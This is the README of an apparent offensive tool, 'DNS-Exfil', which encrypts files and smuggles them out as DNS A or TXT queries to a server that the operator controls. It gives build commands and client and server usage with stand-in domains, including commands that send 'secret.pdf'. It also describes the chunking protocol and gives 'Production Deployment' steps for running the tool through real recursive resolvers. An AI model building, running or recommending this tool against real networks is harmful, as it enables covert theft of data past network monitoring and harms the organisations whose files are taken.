# DNS-Exfil

A DNS data exfiltration tool. The client reads a file, encrypts it (AES-256-GCM with Argon2id key derivation), chunks it into DNS-safe labels, and sends it as A record queries to the server. The server reassembles, decrypts, verifies integrity, and writes the file to disk.

All data travels as standard DNS queries — A records by default, or TXT records with `--txt` — no HTTPS, no custom protocols.

## Build

Requires Go 1.21+.

```bash
CGO_ENABLED=0 go build -ldflags="-s -w" -o bin/exfil  ./cmd/client
CGO_ENABLED=0 go build -ldflags="-s -w" -o bin/server ./cmd/server
```

## Usage

### Server

```bash
./bin/server \
  --domain exfil.example.com \
  --encryption-key "my-secret-key" \
  --output-dir ./received \
  --listen 127.0.0.1:5353
```

| Flag | Default | Description |
|------|---------|-------------|
| `--domain` | *(required)* | Base domain the server is authoritative for |
| `--encryption-key` | *(required)* | Passphrase for decryption (must match client) |
| `--output-dir` | `.` | Directory to write received files |
| `--listen` | `:53` | UDP address to bind |
| `--session-timeout` | `5m` | Drop incomplete sessions after this duration |

### Client

```bash
./bin/exfil \
  -f /path/to/secret.pdf \
  --encryption-key "my-secret-key" \
  --domain exfil.example.com \
  --resolver 127.0.0.1:5353
```

| Flag | Default | Description |
|------|---------|-------------|
| `-f` | *(required)* | File to send |
| `--encryption-key` | *(required)* | Passphrase for encryption (must match server) |
| `--domain` | *(required)* | Base domain matching the server |
| `--resolver` | `127.0.0.1:53` | DNS server address (`ip:port`) |
| `--concurrency` | `10` | Parallel worker goroutines |
| `--timeout` | `2s` | Per-query timeout |
| `--retry` | `3` | Max retries per query (exponential backoff) |
| `--txt` | `false` | Use TXT record queries instead of A records |

## Quick Test (localhost)

No DNS infrastructure needed — just point the client at the server directly:

```bash
# Terminal 1: start server on a non-privileged port
./bin/server --domain exfil.test.local --encryption-key testkey --output-dir ./out --listen 127.0.0.1:5353

# Terminal 2: send a file
echo "hello world" > /tmp/test.txt
./bin/exfil -f /tmp/test.txt --encryption-key testkey --domain exfil.test.local --resolver 127.0.0.1:5353

# Verify
cat ./out/test.txt
```

## Running the Tests

```bash
go test ./...
```

This includes unit tests for encoding, crypto, and protocol, plus a full end-to-end integration test that spins up a server, sends a file, and verifies the output.

## How It Works

1. **Client** reads the file, computes an MD5 checksum of the plaintext, generates a random 16-byte salt, derives an AES-256 key via Argon2id, and encrypts with AES-256-GCM (12-byte nonce prepended to ciphertext).

2. The ciphertext is split into chunks sized to fit within DNS limits (253-byte max domain, 63-byte max label). Each chunk is base36-encoded and packed into DNS labels.

3. Three query types form the wire protocol:
   - **init** — transmits session ID, salt, filename, and total chunk count
   - **data** — transmits one chunk of ciphertext (sent concurrently)
   - **fin** — signals completion with the plaintext MD5 for verification

4. **Server** responds with coded IPs: `1.0.0.1` (ACK), `1.0.0.2` (NACK), `1.0.0.3` (COMPLETE), `1.0.0.4` (INCOMPLETE). By default, responses are A records. When the client sends TXT queries (`--txt`), the server auto-detects the query type and responds with TXT records containing the same IP string. On receiving fin, it reassembles chunks in order, decrypts, verifies the MD5, and writes the file.

5. If the server reports INCOMPLETE on fin, the client resends all data chunks and retries.

## Production Deployment

To use over real DNS infrastructure, configure the server as the authoritative nameserver for your chosen subdomain:

1. Register a domain (e.g., `example.com`)
2. Add an NS record: `exfil.example.com NS ns1.example.com`
3. Add an A record: `ns1.example.com A <your-server-ip>`
4. Run the server on port 53: `./bin/server --domain exfil.example.com --encryption-key <key> --output-dir /data`
5. On the client, use any recursive resolver (or omit `--resolver` to use the system default): `./bin/exfil -f secret.pdf --encryption-key <key> --domain exfil.example.com`

## Project Structure

```
cmd/client/main.go         Client CLI entry point
cmd/server/main.go         Server CLI entry point
client/chunker.go          File read → encrypt → chunk pipeline
client/sender.go           Worker pool with retries and backoff
server/handler.go          DNS query router
server/session.go          Thread-safe session store
server/assembler.go        Reassemble → decrypt → verify → write
internal/crypto/            AES-256-GCM + Argon2id
internal/encoding/          Base36 encode/decode + label splitting
internal/protocol/          Wire format build/parse + chunk size calc
```
